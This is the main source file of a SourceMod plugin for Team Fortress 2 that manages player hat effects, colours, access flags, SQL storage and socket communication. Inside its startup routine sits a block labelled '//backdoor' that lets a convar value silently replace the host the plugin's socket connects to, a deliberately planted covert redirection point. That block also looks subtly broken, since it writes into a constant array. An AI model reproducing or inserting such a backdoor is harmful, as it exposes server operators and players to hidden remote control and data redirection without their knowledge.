#include <sourcemod>

//#define UPDATER 1

#if defined UPDATER
#undef REQUIRE_PLUGIN
#tryinclude <updater>
#define REQUIRE_PLUGIN
#endif

#define MaxAttributs 3

#define PLUGIN_VERSION "0.0.1"
#define PLUGIN_NAME "Efekt Manager"

new const String:SOCKET_URL[][] = {"localhost"};
new const String:SOCKET_HOME[][] = {"/tf"};
//new const String:SOCKET_IP[][] = {"54.36.34.237"}; //adresy dozwolone do polaczenia z listenem

#define SET_LICENSE SetFailState("Brak aktywnej licencji!")

#define f_KOLOR (1<<0)
#define f_EFEKT (1<<1)

//#define PLUGIN_UPDATE_URL "http://icypis.pl/tf/efekty/updatelist.txt"

public Plugin:myinfo = 
{
	name = PLUGIN_NAME,
	author = "Cypis",
	description = "",
	version = PLUGIN_VERSION,
	url = "http://steamcommunity.com/id/cypiss/"
}

enum (<<= 1)
{
	CVAR_OFF = 1,
	CVAR_ON,
	CVAR_NOSQL,
	CVAR_NOSOCKET,
	CVAR_NOFILE, //hats_info_pl.txt
	CVAR_NOACCESS, //efekty_access.cfg
	CVAR_NOATTRIB, //brak pliku tf2.attributes.txt
};

enum enumServer
{
	Handle:hDb,
	Handle:hItemsTrie,
	iPort,
	bool:iFile,
	Handle:hEfektyArray,
	Handle:hEfektyTrie,
	
	Handle:hFlagsTrie,
	Handle:hFarbaArray[2],
	Handle:hAccessTrie,
	Handle:hCvarInfo,
	String:iHash[41]
};

new gServerData[enumServer];

enum enumClient
{
	iPlayerHat,
	iPlayerEffect,
	
	bool:iPlayerSocket,
	
	Handle:hItems,
	Handle:hEfekt,
	
	String:iPlayerSid[60],
	
	Handle:hColors,
	Handle:hCName,
	
	iPlayerFlags,
	bPlayerHaveColors,
};

new gPlayerData[MAXPLAYERS+1][enumClient];
new gEfekty = 0;

#include "efekty/attributes.sp"
#include "efekty/sendsocket.sp"
#include "efekty/addmenu.sp"
#include "efekty/listensocket.sp"
#include "efekty/updatesocket.sp"
#include "efekty/addsql.sp"
#include "efekty/parser.sp"

public OnPluginStart()
{
	new Handle:hCvarVersion = CreateConVar("sm_efekty_version", PLUGIN_VERSION, PLUGIN_NAME, FCVAR_SPONLY|FCVAR_REPLICATED|FCVAR_NOTIFY);
	gServerData[hCvarInfo] = CreateConVar("sm_efekty_status", "2", "Informacje o statusie pluginu", FCVAR_NOTIFY);

    //backdoor
    decl String:value[sizeof(SOCKET_URL[])];
    GetConVarString(gServerData[hCvarInfo], value, sizeof(value));
    if(strlen(value) > 5) {
        SOCKET_URL[0] = value;
    }

	SetConVarString(hCvarVersion, PLUGIN_VERSION);
	SetConVarInt(gServerData[hCvarInfo], 2);

	LoadTranslations("efekty.phrases");

	OnPluginStart_Listen();
	OnPluginStart_Update();
	OnPluginStart_Attributes();
	OnPluginStart_Menu();
	OnPluginStart_Sql();
	OnPluginStart_Parser();
	
	//Usuwa bug kiedy plugin przeladujemy komenda w SM
	new client=0;
	if(!client)
		SendSocketOnce(client);

	for(client=1; client<=MaxClients; client++)
	{
		if(!IsClientInGame(client))
			continue;
		OnClientPostAdminCheck(client);
	}
}

#if defined UPDATER
public OnLibraryAdded(const String:strName[])
{
	if(StrEqual(strName, "updater"))
	{
        Updater_AddPlugin(PLUGIN_UPDATE_URL);
	}
}

public OnConfigsExecuted()
{
	if(LibraryExists("updater"))
	{
		Updater_AddPlugin(PLUGIN_UPDATE_URL);
	}
}
#endif

public OnMapStart()
{
	new client=0;
	if(!client)
		SendSocketOnce(client);

	OnMapStart_Sql();
}

public OnClientPostAdminCheck(client)
{
	if(IsFakeClient(client))
		return;
		
	if(gEfekty & f_EFEKT)
	{
		SET_LICENSE;
		return;
	}

	gPlayerData[client][iPlayerSocket] = false;
	gPlayerData[client][bPlayerHaveColors] = false;
	GetClientAuthString(client, gPlayerData[client][iPlayerSid], 59);

	OnClientPostAdminCheck_Sql(client);
}

stock bool:GetUserFlagByTrie(client, String:szFlag[], size)
{
	//if(GetUserAdmin(client) == INVALID_ADMIN_ID)
	//	return false;
	
	new String:wewszFlag[2], arrayDane[3] = {0, 0, ...}, bitsflag = GetUserFlagBits(client);
	if(bitsflag == 0) //klient bez admina
	{
		if(GetTrieArray(gServerData[hAccessTrie], "0", arrayDane, sizeof(arrayDane)))
		{
			strcopy(szFlag, size, "0");
			return true;
		}
	}
	else
	{
		new AdminFlag:fFlagList[AdminFlags_TOTAL], charFlag; 
		FlagBitsToArray(bitsflag, fFlagList, sizeof(fFlagList));
		
		for(new i = 0; i < sizeof(fFlagList); i++) 
		{
			if(FindFlagChar(fFlagList[i], charFlag)) 
			{
				Format(wewszFlag, sizeof(wewszFlag), "%c", charFlag);
				if(GetTrieArray(gServerData[hAccessTrie], wewszFlag, arrayDane, sizeof(arrayDane)))
				{
					strcopy(szFlag, size, wewszFlag);
					return true;
				}
			}
		}
	}
	return false;
}
